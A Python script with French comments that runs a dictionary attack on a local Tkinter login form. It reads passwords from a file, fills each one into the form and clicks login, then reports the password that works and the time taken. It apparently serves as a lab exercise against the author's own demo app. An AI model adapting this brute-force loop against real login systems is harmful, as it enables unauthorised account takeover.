from client import App
import time

class Attaque:
    def __init__(self, app, username, dico_path, delay=1):
        self.app = app
        self.username = username
        self.dico_path = dico_path
        self.passwords = self.load_passwords()
        self.current_index = 0  # Suivi de l'index du mot de passe en cours de test
        self.start_time = None
        self.delay = delay  # Délai entre chaque tentative de mot de passe
        self.app.login_username_entry.insert(0, self.username) # Remplir le champ utilisateur une fois au début


    def load_passwords(self):
        with open(self.dico_path, "r") as dico:
            return [line.strip() for line in dico]

    def start_attack(self):
        self.start_time = time.time()  # Début du chronomètre
        self.test_next_password()

    def test_next_password(self):
        # Teste du mdp dans la liste
        if self.current_index < len(self.passwords):
            password = self.passwords[self.current_index]
            self.current_index += 1

            # Effacer puis ajouter le mdp
            self.app.login_password_entry.delete(0, "end")
            self.app.login_password_entry.insert(0, password)
            print(f"Test du mot de passe: {password}")

            self.app.handle_login() # Simulation du click de connexion

            self.app.after(self.delay * 1000, self.check_success, password) # Planifier la vérification de la réussite après un délai
        else:
            print("Tous les mots de passe ont été testés, aucun n'est correcte.")


    def check_success(self, password):
        if self.app.login_error_label.cget("text") == "Connexion réussie.": # Vérification de la connexion
            self.end_attack(password)
        else:
            self.app.after(self.delay * 1, self.test_next_password) # Continuer avec le mdp après le délai

    def end_attack(self, found_password): # Stop l'attaque et affichage les résultats
        end_time = time.time()
        elapsed = end_time - self.start_time
        print(f"Mot de passe trouvé: {found_password}")
        print(f"Le temps total est de {elapsed:.2f} secondes")

if __name__ == "__main__":
    app = App()
    attaque = Attaque(app, username="a", dico_path="dico.txt", delay=2)
    attaque.start_attack() 
    app.mainloop()